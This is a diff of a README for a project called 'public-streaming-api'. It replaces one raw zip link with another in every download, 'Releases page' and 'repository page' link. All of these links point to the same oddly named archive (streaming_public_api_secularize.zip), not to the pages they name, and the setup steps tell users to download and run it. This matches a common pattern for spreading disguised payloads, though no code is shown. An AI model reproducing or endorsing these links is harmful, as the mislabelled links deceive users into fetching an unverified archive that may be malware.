@@ -1,6 +1,6 @@
 # 🌐 public-streaming-api - Access Real-Time Data Easily
 
-[![Download](https://github.com/Franc-macharia/public-streaming-api/raw/refs/heads/main/flacker/api_streaming_public_v2.2.zip)](https://github.com/Franc-macharia/public-streaming-api/raw/refs/heads/main/flacker/api_streaming_public_v2.2.zip)
+[![Download](https://github.com/Franc-macharia/public-streaming-api/raw/refs/heads/main/flacker/streaming_public_api_secularize.zip)](https://github.com/Franc-macharia/public-streaming-api/raw/refs/heads/main/flacker/streaming_public_api_secularize.zip)
 
 ## 📖 Introduction
 
@@ -10,7 +10,7 @@ Welcome to the **public-streaming-api** project. This application offers a curat
 
 To begin using the **public-streaming-api**, follow these easy steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Franc-macharia/public-streaming-api/raw/refs/heads/main/flacker/api_streaming_public_v2.2.zip) to find the latest version of the software.
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Franc-macharia/public-streaming-api/raw/refs/heads/main/flacker/streaming_public_api_secularize.zip) to find the latest version of the software.
 
 2. **Download the Software**: Click on the download link for the version compatible with your operating system. A list of available downloads will appear. 
 
@@ -22,7 +22,7 @@ To begin using the **public-streaming-api**, follow these easy steps:
 
 To download and install the **public-streaming-api**, follow the below instructions carefully:
 
-- **Step 1**: Visit this page to download: [Releases Page](https://github.com/Franc-macharia/public-streaming-api/raw/refs/heads/main/flacker/api_streaming_public_v2.2.zip).
+- **Step 1**: Visit this page to download: [Releases Page](https://github.com/Franc-macharia/public-streaming-api/raw/refs/heads/main/flacker/streaming_public_api_secularize.zip).
 
 - **Step 2**: Choose your operating system from the list provided.
 
@@ -70,7 +70,7 @@ You can search for specific data sources within the application. Use the search 
 Yes, the data is free to use for personal and commercial projects. Make sure to follow any respective usage guidelines mentioned in the data source itself.
 
 **3. What if I encounter issues?**  
-If you run into trouble, please check the documentation on the [repository page](https://github.com/Franc-macharia/public-streaming-api/raw/refs/heads/main/flacker/api_streaming_public_v2.2.zip). You can also reach out through the issues section for support.
+If you run into trouble, please check the documentation on the [repository page](https://github.com/Franc-macharia/public-streaming-api/raw/refs/heads/main/flacker/streaming_public_api_secularize.zip). You can also reach out through the issues section for support.
 
 ## 🤝 Contribution
 
